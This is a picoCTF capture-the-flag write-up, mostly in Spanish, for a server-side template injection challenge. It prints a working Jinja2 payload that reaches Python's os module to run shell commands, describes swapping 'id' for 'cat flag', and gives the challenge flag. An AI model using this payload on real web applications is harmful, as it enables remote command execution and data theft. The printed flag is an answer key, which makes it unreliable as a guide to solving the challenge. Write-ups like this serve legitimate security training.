I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:52688/)!

Hints:
1.-Server Side Template Injection

### Solucion

```
Es una pagina web en la que nos deja escribir texto en un cuadro, al comprobar con doble llave vemos que ejecuta operacion, buscando en internet en una pagina encontre esta:
`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

Que es una plantilla peligrosa para ejecutar comandos remotamente en un sistema,
solo remplace id por cat flag y listo la pagina soloto esta:

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}
```